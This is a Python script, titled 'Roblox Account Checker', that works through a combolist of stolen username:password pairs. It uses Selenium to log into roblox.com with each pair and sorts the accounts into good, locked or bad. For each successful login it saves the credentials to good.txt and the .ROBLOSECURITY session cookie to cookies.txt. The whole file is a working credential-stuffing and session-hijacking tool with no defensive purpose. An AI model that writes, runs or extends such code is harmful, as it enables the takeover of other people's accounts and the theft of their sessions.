import os
from time import sleep
from colorama import Fore, Style
from selenium import webdriver
from pyfiglet import Figlet
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import chromedriver_autoinstaller

os.system("cls")
URL = "https://www.roblox.com/Login"


def center_text(text):
    terminal_width = os.get_terminal_size().columns
    padding = (terminal_width - len(text)) // 2
    centered_text = " " * padding + text
    return centered_text


fig = Figlet(font="slant")
ascii_art = fig.renderText("Roblox Account Checker")

ascii_art_lines = ascii_art.split("\n")

centered_ascii_art = "\n".join(center_text(line) for line in ascii_art_lines)

print(center_text(f"{Fore.MAGENTA}{centered_ascii_art}{Style.RESET_ALL}"))

magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
reset = Fore.RESET

WINDOW_SIZE = "1000,800"
options = webdriver.ChromeOptions()
options.add_argument("--window-size=%s" % WINDOW_SIZE)
options.add_experimental_option("excludeSwitches", ["enable-logging"])
options.add_experimental_option("detach", True)

chromedriver_autoinstaller.install()

comboName = str(input(f"{magenta}Combolist name: {reset}"))
with open(comboName + ".txt", "r", encoding="utf-8", errors="ignore") as comboFile:
    combolist = comboFile.readlines()

good_file = open("good.txt", "w")

unprocessed_combos = []

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(":")

    password = acc[1]
    username = acc[0]

    driver = webdriver.Chrome(options=options)
    driver.get(URL)
    sleep(1.5)
    cookieBtn = driver.find_element(
        By.XPATH, "//*[contains(text(), 'Allem zustimmen')]"
    )
    cookieBtn.click()

    usernameInput = driver.find_element(By.NAME, "username")
    usernameInput.send_keys(username)
    passwordInput = driver.find_element(By.NAME, "password")
    passwordInput.send_keys(password)
    lBtn = driver.find_element(By.ID, "login-button")
    lBtn.click()
    sleep(2.5)

    while True:
        try:
            verification_element = driver.find_element(
                By.XPATH, "/html/body/div[18]/div[2]/div/div"
            )
            print("[ info ] >>> [ Solve captcha! ]")
            sleep(1)
        except NoSuchElementException:
            print("[ info ] >>> [ Captcha solved or no captcha found ]")
            break

    try:
        sleep(2.5)
        driver.find_element(By.XPATH, "//p[@id='login-form-error']")
        driver.close()
        status = "BAD (can be ratelimit)"
        print(f"{red}[ BAD ] >>> {combo} {reset}")
    except NoSuchElementException:
        if "securityNotification" in driver.current_url:
            status = "LOCKED"
            print(f"{yellow}[ LOCKED ] >>> {combo} {reset}")
        elif "home" in driver.current_url:
            cookies = driver.get_cookies()
            target_cookie_name = ".ROBLOSECURITY"
            target_cookie = next((cookie for cookie in cookies if cookie["name"] == target_cookie_name), None)
            if target_cookie:
                target_cookie_value = target_cookie["value"]
                with open("cookies.txt", "a") as cookie_file:
                    cookie_file.write(f"{target_cookie_value}\n")
            status = "GOOD"
            print(f"{green}[ GOOD ] >>> {combo} {reset}")
            with open("good.txt", 'a') as file:
                file.write(f"{combo}")
        else:
            status = "BAD"
            print(f"{red}[ BAD or 2FA ] >>> {combo} {reset}")
        driver.close()
    else:
        unprocessed_combos.append(combo)

good_file.close()

with open(comboName + ".txt", "w") as comboFile:
    comboFile.writelines(unprocessed_combos)
